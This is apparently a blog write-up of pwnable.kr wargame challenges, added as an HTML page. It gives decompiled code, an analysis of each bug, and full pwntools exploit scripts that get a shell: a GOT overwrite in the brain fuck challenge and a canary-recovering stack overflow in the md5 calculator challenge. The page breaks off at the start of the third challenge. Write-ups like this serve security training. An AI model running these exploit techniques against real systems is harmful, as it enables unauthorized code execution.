@@ -1,0 +1,325 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="（PS：文章内容会随着做题进度进行更新） [brain fuck] I made a simple brain-fuck language emulation program written in C.The [ ] commands are not implemented yet. However the rest functionality seems working fine.Find a">
+<meta name="keywords" content="security,pwn">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Rookiss Writeup [pwnable.kr]">
+<meta property="og:url" content="http://rickgray.me/2015/07/25/rookiss-writeup-pwnable-kr/index.html">
+<meta property="og:site_name" content="rickgray.me">
+<meta property="og:description" content="（PS：文章内容会随着做题进度进行更新） [brain fuck] I made a simple brain-fuck language emulation program written in C.The [ ] commands are not implemented yet. However the rest functionality seems working fine.Find a">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="http://rickgray.me/images/articles/2015-07-25-rookiss-writeup-pwnable-kr/brain-fuck-1.png">
+<meta property="og:image" content="http://rickgray.me/images/articles/2015-07-25-rookiss-writeup-pwnable-kr/md5-calculator-1.png">
+<meta property="og:updated_time" content="2018-04-24T15:48:57.518Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Rookiss Writeup [pwnable.kr]">
+<meta name="twitter:description" content="（PS：文章内容会随着做题进度进行更新） [brain fuck] I made a simple brain-fuck language emulation program written in C.The [ ] commands are not implemented yet. However the rest functionality seems working fine.Find a">
+<meta name="twitter:image" content="http://rickgray.me/images/articles/2015-07-25-rookiss-writeup-pwnable-kr/brain-fuck-1.png">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>Rookiss Writeup [pwnable.kr]</title>
+    <!-- styles -->
+    <link rel="stylesheet" href="/css/style.css">
+    <!-- persian styles -->
+    
+      <link rel="stylesheet" href="/css/rtl.css">
+    
+    <!-- rss -->
+    
+    
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Archives</a></li>
+         
+          <li><a href="http://github.com/RickGray">Projects</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2015/07/31/discuz-all-version-stored-xss-analysis/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/2015/07/24/toddler-s-bottle-writeup-pwnable-kr/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://rickgray.me/2015/07/25/rookiss-writeup-pwnable-kr/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://rickgray.me/2015/07/25/rookiss-writeup-pwnable-kr/&text=Rookiss Writeup [pwnable.kr]"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://rickgray.me/2015/07/25/rookiss-writeup-pwnable-kr/&title=Rookiss Writeup [pwnable.kr]"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://rickgray.me/2015/07/25/rookiss-writeup-pwnable-kr/&is_video=false&description=Rookiss Writeup [pwnable.kr]"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Rookiss Writeup [pwnable.kr]&body=Check out this article: http://rickgray.me/2015/07/25/rookiss-writeup-pwnable-kr/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://rickgray.me/2015/07/25/rookiss-writeup-pwnable-kr/&title=Rookiss Writeup [pwnable.kr]"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://rickgray.me/2015/07/25/rookiss-writeup-pwnable-kr/&title=Rookiss Writeup [pwnable.kr]"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://rickgray.me/2015/07/25/rookiss-writeup-pwnable-kr/&title=Rookiss Writeup [pwnable.kr]"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://rickgray.me/2015/07/25/rookiss-writeup-pwnable-kr/&title=Rookiss Writeup [pwnable.kr]"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://rickgray.me/2015/07/25/rookiss-writeup-pwnable-kr/&name=Rookiss Writeup [pwnable.kr]&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#brain-fuck"><span class="toc-number">1.</span> <span class="toc-text">[brain fuck]</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#md5-calculator"><span class="toc-number">2.</span> <span class="toc-text">[md5 calculator]</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#simple-login"><span class="toc-number">3.</span> <span class="toc-text">[simple login]</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index my4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        Rookiss Writeup [pwnable.kr]
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">rickgray.me</span>
+      </span>
+      
+    <div class="postdate">
+        <time datetime="2015-07-24T16:00:00.000Z" itemprop="datePublished">2015-07-25</time>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link" href="/tags/pwn/">pwn</a>, <a class="tag-link" href="/tags/security/">security</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <p>（PS：文章内容会随着做题进度进行更新）</p>
+<h3 id="brain-fuck"><a href="#brain-fuck" class="headerlink" title="[brain fuck]"></a>[brain fuck]</h3><blockquote>
+<p>I made a simple brain-fuck language emulation program written in C.<br><br>The [ ] commands are not implemented yet. However the rest functionality seems working fine.<br><br>Find a bug and exploit it to get a shell. </p>
+<p>Download : <a href="http://pwnable.kr/bin/bf" target="_blank" rel="noopener">http://pwnable.kr/bin/bf</a><br><br>Download : <a href="http://pwnable.kr/bin/bf_libc.so" target="_blank" rel="noopener">http://pwnable.kr/bin/bf_libc.so</a></p>
+<p>Running at : nc pwnable.kr 9001</p>
+</blockquote>
+<p><code>bf</code> 为 32 位 ELF 程序：</p>
+<p><img src="/images/articles/2015-07-25-rookiss-writeup-pwnable-kr/brain-fuck-1.png" alt="img"></p>
+<p>使用 IDA 分析，程序会让你输入一串字符（最多1024bytes）然后遍历字符进行解析：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax@4</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// edx@4</span></span><br><span class="line">  <span class="keyword">size_t</span> i; <span class="comment">// [sp+28h] [bp-40Ch]@1</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// [sp+2Ch] [bp-408h]@1</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// [sp+42Ch] [bp-8h]@1</span></span><br><span class="line">	</span><br><span class="line">  v7 = *MK_FP(__GS__, <span class="number">20</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  p = (<span class="keyword">int</span>)&amp;tape;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"welcome to brainfuck testing system!!"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"type some brainfuck instructions except [ ]"</span>);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;v6, <span class="number">0</span>, <span class="number">0x400</span>u);</span><br><span class="line">  fgets((<span class="keyword">char</span> *)&amp;v6, <span class="number">1024</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;v6); ++i )</span><br><span class="line">    do_brainfuck(*((_BYTE *)&amp;v6 + i));</span><br><span class="line">  result = <span class="number">0</span>;</span><br><span class="line">  v4 = *MK_FP(__GS__, <span class="number">20</span>) ^ v7;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><code>do_brainfuck</code> 函数有一些列对指针 <code>p</code> 进行操作的分支：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">do_brainfuck</span><span class="params">(<span class="keyword">char</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax@1</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// ebx@7</span></span><br><span class="line">	</span><br><span class="line">  result = a1;</span><br><span class="line">  <span class="keyword">switch</span> ( a1 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">'&gt;'</span>:</span><br><span class="line">      result = p++ + <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">'&lt;'</span>:</span><br><span class="line">      result = p-- - <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">'+'</span>:</span><br><span class="line">      result = p;</span><br><span class="line">      ++*(_BYTE *)p;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">'-'</span>:</span><br><span class="line">      result = p;</span><br><span class="line">      --*(_BYTE *)p;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">'.'</span>:</span><br><span class="line">      result = <span class="built_in">putchar</span>(*(_BYTE *)p);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">','</span>:</span><br><span class="line">      v2 = p;</span><br><span class="line">      result = getchar();</span><br><span class="line">      *(_BYTE *)v2 = result;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">'['</span>:</span><br><span class="line">      result = <span class="built_in">puts</span>(<span class="string">"[ and ] not supported."</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="keyword">return</span> result;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这里的指针 <code>p</code> 是一个字符型指针，每次自增或自减会使得指向的地址 <code>+0x1</code> 或 <code>-0x1</code>。根据分析可以得到如下解析说明：</p>
+<pre><code>&apos;&gt;&apos; ==&gt; p++
+&apos;&lt;&apos; ==&gt; p--
+&apos;+&apos; ==&gt; *p += 1
+&apos;-&apos; ==&gt; *p -= 1
+&apos;.&apos; ==&gt; putchar(*p)
+&apos;,&apos; ==&gt; *p = getchar()
+&apos;[&apos; ==&gt; puts(xxxx)
+</code></pre><p>这里既能控制指针，又能读写指针指向地址的值，并且指针 <code>p</code> 初始值为 <code>0x0804A0A0 (tape)</code>，而往低地址一点就是 <code>.got.plt</code>。因为题目提供了 libc 文件，所以这里可以通过泄漏 <code>.got.plt</code> 中的 <code>fgets()</code> 函数地址来计算目标环境的 <code>system()</code> 函数地址，然后重写 <code>.got.plt</code> 结构来使得 <code>fgets()</code> 的 GOT 变为 <code>system()</code>，<code>memset()</code> 的 GOT 变为 <code>gets()</code>，然后通过修改 <code>putchar()</code> 的 GOT 为主函数 <code>main()</code>，从而执行到 <code>0x08048700 - 0x08048734</code> 处代码的时候实际上执行的是 <code>system(gets())</code>：</p>
+<pre><code>.text:08048700                 mov     dword ptr [esp+8], 400h ; n
+.text:08048708                 mov     dword ptr [esp+4], 0 ; c
+.text:08048710                 lea     eax, [esp+2Ch]
+.text:08048714                 mov     [esp], eax      ; s
+.text:08048717                 call    _memset         ; rewrite memset() to fgets()
+.text:0804871C                 mov     eax, ds:stdin@@GLIBC_2_0
+.text:08048721                 mov     [esp+8], eax    ; stream
+.text:08048725                 mov     dword ptr [esp+4], 400h ; n
+.text:0804872D                 lea     eax, [esp+2Ch]
+.text:08048731                 mov     [esp], eax      ; s
+.text:08048734                 call    _fgets          ; rewrite fgets() to system()
+.text:08048739                 mov     dword ptr [esp+28h], 0
+.text:08048741                 jmp     short loc_8048760
+</code></pre><p>最终的 exp 如下：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># Remote EXP</span></span><br><span class="line">libc = ELF(<span class="string">'./bf_libc.so'</span>)</span><br><span class="line">p = remote(<span class="string">'pwnable.kr'</span>, <span class="number">9001</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Local EXP</span></span><br><span class="line"><span class="comment"># libc = ELF('./libc.so.6')</span></span><br><span class="line"><span class="comment"># p = process('./bf')</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvline_startswith(<span class="string">'type'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Move the pointer to .got.plt fgets()</span></span><br><span class="line">payload = <span class="string">'&lt;'</span> * (<span class="number">0x0804A0A0</span> - <span class="number">0x0804A010</span>)</span><br><span class="line"><span class="comment"># Print .got.plt fgets() address in memory each bytes</span></span><br><span class="line">payload += <span class="string">'.&gt;'</span> * <span class="number">4</span></span><br><span class="line"><span class="comment"># reMove the pointer to .got.plt fgets()</span></span><br><span class="line">payload += <span class="string">'&lt;'</span> * <span class="number">4</span></span><br><span class="line"><span class="comment"># Write .got.plt fgets() to system()</span></span><br><span class="line">payload += <span class="string">',&gt;'</span> * <span class="number">4</span></span><br><span class="line"><span class="comment"># Move the pointer to .got.plt memset()</span></span><br><span class="line">payload += <span class="string">'&gt;'</span> * (<span class="number">0x0804A02C</span> - <span class="number">0x0804A014</span>)</span><br><span class="line"><span class="comment"># Write .got.plt memset() to fgets()</span></span><br><span class="line">payload += <span class="string">',&gt;'</span> * <span class="number">4</span></span><br><span class="line"><span class="comment"># Writr .got.plt putchar() to main() 0x08048671</span></span><br><span class="line">payload += <span class="string">',&gt;'</span> * <span class="number">4</span></span><br><span class="line"><span class="comment"># Call putchar(), actually main() called</span></span><br><span class="line">payload += <span class="string">'.'</span></span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">fgets_addr = p.recvn(<span class="number">4</span>)[::<span class="number">-1</span>].encode(<span class="string">'hex'</span>)</span><br><span class="line">system_addr = int(fgets_addr, <span class="number">16</span>) - libc.symbols[<span class="string">'fgets'</span>] + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">gets_addr = int(fgets_addr, <span class="number">16</span>) - libc.symbols[<span class="string">'fgets'</span>] + libc.symbols[<span class="string">'gets'</span>]</span><br><span class="line"></span><br><span class="line">p.send(p32(system_addr))</span><br><span class="line">p.send(p32(gets_addr))</span><br><span class="line">p.send(p32(<span class="number">0x08048671</span>))</span><br><span class="line">p.sendline(<span class="string">'/bin/sh'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h3 id="md5-calculator"><a href="#md5-calculator" class="headerlink" title="[md5 calculator]"></a>[md5 calculator]</h3><blockquote>
+<p>We made a simple MD5 calculator as a network service.<br><br>Find a bug and exploit it to get a shell.</p>
+<p>Download : <a href="http://pwnable.kr/bin/hash" target="_blank" rel="noopener">http://pwnable.kr/bin/hash</a><br><br>hint : this service shares the same machine with pwnable.kr web service</p>
+<p>Running at : nc pwnable.kr 9002</p>
+</blockquote>
+<p><code>hash</code> 为 32 位 ELF 程序，并且开启了 <code>CANARY</code> 和 <code>NX</code>：</p>
+<p><img src="/images/articles/2015-07-25-rookiss-writeup-pwnable-kr/md5-calculator-1.png" alt="img"></p>
+<p>程序逻辑首先是通过一个随机 HASH 值验证，然后让你输入一串 Base64 编码的字符串，程序对 Base64 解码后的字符串计算 MD5 值并输出：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// eax@1</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [sp+18h] [bp-8h]@1</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// [sp+1Ch] [bp-4h]@1</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"- Welcome to the free MD5 calculating service -"</span>);</span><br><span class="line">  v3 = time(<span class="number">0</span>);</span><br><span class="line">  srand(v3);</span><br><span class="line">  v6 = my_hash();</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Are you human? input captcha : %d\n"</span>, v6);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%d"</span>, &amp;v5);</span><br><span class="line">  <span class="keyword">if</span> ( v6 != v5 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"wrong captcha!"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Welcome! you are authenticated."</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Encode your data with BASE64 then paste me!"</span>);</span><br><span class="line">  process_hash();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Thank you for using our service."</span>);</span><br><span class="line">  system(<span class="string">"echo `date` &gt;&gt; log"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>通过分析代码可以知道，在输入 Base64 字符串时程序可接收 1024bytes（原始字符串长度 768bytes），但是在 <code>process_hash</code> 函数处理中保存解码后的缓冲区空间只有 512bytes：</p>
+<p>处理输入：</p>
+<pre><code>.text:08048FE0                 mov     eax, ds:stdin@@GLIBC_2_0
+.text:08048FE5                 mov     [esp+8], eax    ; stream
+.text:08048FE9                 mov     dword ptr [esp+4], 400h ; n Base64 编码后的字符串 1024bytes，原始字符串长度最大为 768bytes (1024 * 3 / 4)
+.text:08048FF1                 mov     dword ptr [esp], offset g_buf ; s
+.text:08048FF8                 call    _fgets
+</code></pre><p>Base64 解码处理：</p>
+<pre><code>.text:08049015                 lea     eax, [ebp+var_20C]
+.text:0804901B                 mov     [esp+4], eax
+.text:0804901F                 mov     dword ptr [esp], offset g_buf
+.text:08049026                 call    Base64Decode
+</code></pre><p>（由于开启了 <code>CANARY</code>，<code>[ebp+0xc]</code> 存储的是 CANARY 值，<code>0x20c - 0xc = 512</code> 字节）</p>
+<p>这里 768 字节的可输入长度（经 Base64 解码后）超过了可存储缓冲区的 512 字节，形成溢出。但由于 <code>CANARY</code> 的存在必须要知道准确的 CANARY 值才能够溢出后成功返回控制 PC 指针。</p>
+<p>由于 CANARY 值在程序初始化载入运行之前就已经生成，并且在 <code>my_hash</code> 产生的 HASH 验证值也使用了 CANARY，并且 8 次 <code>rand()</code> 调用的随机种子为当前的时间值（main() 中已经设置）：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">my_hash</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax@4</span></span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// edx@4</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [sp+0h] [bp-38h]@1</span></span><br><span class="line">  <span class="keyword">int</span> nums[<span class="number">8</span>]; <span class="comment">// [sp+Ch] [bp-2Ch]@2</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [sp+2Ch] [bp-Ch]@1</span></span><br><span class="line"></span><br><span class="line">  v4 = *MK_FP(__GS__, <span class="number">20</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">7</span>; ++i )</span><br><span class="line">    nums[i] = rand();</span><br><span class="line">  result = nums[<span class="number">4</span>] - nums[<span class="number">6</span>] + nums[<span class="number">7</span>] + v4 + nums[<span class="number">2</span>] - nums[<span class="number">3</span>] + nums[<span class="number">1</span>] + nums[<span class="number">5</span>];</span><br><span class="line">  v1 = *MK_FP(__GS__, <span class="number">20</span>) ^ v4;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>因此可以使用得到的 <code>Capcha</code> 值和当前时间反推 CANARY 值：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> t = atoi(argv[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">int</span> c = atoi(argv[<span class="number">2</span>]);</span><br><span class="line">    <span class="keyword">int</span> canary = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> nums[<span class="number">8</span>];</span><br><span class="line"></span><br><span class="line">    srand(t);</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(;i &lt;= <span class="number">7</span>; i++) &#123;</span><br><span class="line">        nums[i] = rand();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// c = nums[1] + nums[5] + nums[2] - nums[3] + nums[7] + canary + nums[4] - nums[6]</span></span><br><span class="line">    canary = c - nums[<span class="number">1</span>] - nums[<span class="number">5</span>] - nums[<span class="number">2</span>] + nums[<span class="number">3</span>] - nums[<span class="number">7</span>] - nums[<span class="number">4</span>] + nums[<span class="number">6</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%x\n"</span>, canary);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>最终构造的 Payload 结构就该为：</p>
+<pre><code>[&apos;A&apos; * 512]-[CANARY]-[&apos;A&apos; * 12]-[plt_system]-[0]-[p(&quot;/bin/sh&quot;)]
+
+512bytes + 4bytes + 12bytes + 4bytes + 4bytes + 4bytes = 540bytes
+
+Base64([540bytes]) ==&gt; 720bytes
+</code></pre><p>因为输入的 Base64 字符串存于 <code>.bss</code> 段 <code>0x0804B0E0</code> 处，所以可以将 <code>/bin/sh</code> 字节添加到输入的字符串后面，结合 Payload 的结构将其写到 <code>0x0804B0E0 + 720</code> 处，最终 exp 如下：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> urllib2</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># elf = ELF('./hash')</span></span><br><span class="line"><span class="comment"># plt_system = elf.plt['system']</span></span><br><span class="line">plt_system = <span class="number">0x08048880</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Local EXP</span></span><br><span class="line">t = int(time.time())</span><br><span class="line"><span class="comment"># p = process('./hash')</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Remote EXP</span></span><br><span class="line"><span class="comment"># date = urllib2.urlopen('http://pwnable.kr').headers['Date']</span></span><br><span class="line"><span class="comment"># t = int(time.mktime(time.strptime(date, '%a, %d %b %Y  %H:%M:%S %Z')))</span></span><br><span class="line"><span class="comment"># t += random.randint(0, 3)</span></span><br><span class="line">p = remote(<span class="string">'127.0.0.1'</span>, <span class="number">9002</span>)</span><br><span class="line"></span><br><span class="line">capcha = re.search(<span class="string">r'(-?[\d]+)'</span>, p.recvline_regex(<span class="string">r'(-?[\d]&#123;5,&#125;)'</span>)).group(<span class="number">0</span>)</span><br><span class="line">p.sendline(capcha)</span><br><span class="line"></span><br><span class="line">canary = <span class="string">'0x'</span> + os.popen(<span class="string">'./hashc &#123;&#125; &#123;&#125;'</span>.format(str(t), capcha)).read()</span><br><span class="line">canary = int(canary, <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'A'</span> * <span class="number">512</span> + p32(canary) + <span class="string">'A'</span> * <span class="number">12</span> + p32(plt_system) + p32(<span class="number">0x8048a00</span>) + p32(<span class="number">0x0804B0E0</span> + <span class="number">540</span>*<span class="number">4</span>/<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(b64e(payload) + <span class="string">'/bin/sh\0'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h3 id="simple-login"><a href="#simple-login" class="headerlink" title="[simple login]"></a>[simple login]</h3><blockquote>
+<p>Can you get authentication from this server?</p>
+<p>Download : <a href="http://pwnable.kr/bin/login" target="_blank" rel="noopener">http://pwnable.kr/bin/login</a></p>
+<p>Running at : nc pwnable.kr 9003</p>
+</blockquote>
+<p><code>login</code> 为 32 位 ELF 程序，简单使用 IDA 分析程序，可以得到主要程序逻辑：</p>
